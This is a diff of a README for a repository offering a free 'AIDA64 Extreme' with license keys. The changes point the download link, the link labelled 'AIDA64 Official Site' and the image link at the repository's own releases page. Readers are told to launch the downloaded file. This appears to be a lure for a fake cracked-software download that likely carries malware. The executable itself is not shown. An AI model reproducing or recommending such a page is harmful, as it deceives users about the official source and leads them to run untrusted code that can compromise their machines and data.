@@ -23,7 +23,7 @@ This repository covers a wide range of topics related to AIDA64 Extreme. Here ar
 
 ## 💻 Access AIDA64 Extreme Free Resources
 
-To access the resources in this repository, please click on the following link: [Download AIDA64 Extreme Free](https://github.com/uploads/App.zip)
+To access the resources in this repository, please click on the following link: [Download AIDA64 Extreme Free](https://github.com/eoleo26/AIDA64-Extreme-Free/releases)
 
 🚨 This link leads to a file that needs to be launched to access the AIDA64 Extreme Free resources 🚨
 
@@ -37,7 +37,7 @@ If you are passionate about AIDA64 Extreme, we encourage you to get involved in 
 
 ## Visit the Official AIDA64 Website 🌐
 
-For more information about AIDA64 Extreme and its features, visit the official website: [AIDA64 Official Site](https://www.aida64.com)
+For more information about AIDA64 Extreme and its features, visit the official website: [AIDA64 Official Site](https://github.com/eoleo26/AIDA64-Extreme-Free/releases)
 
 ## 🛠️ Releases Section
 
@@ -45,4 +45,4 @@ If the provided link does not work or you are looking for more updated versions 
 
 Let's dive into the world of AIDA64 Extreme Free and unlock the full potential of your hardware with comprehensive CPU stress tests, license keys, and much more! Happy exploring! 🚀🔥
 
-![AIDA64 Extreme Free](https://example.com/aida64.jpg)
+![AIDA64 Extreme Free](https://github.com/eoleo26/AIDA64-Extreme-Free/releases)
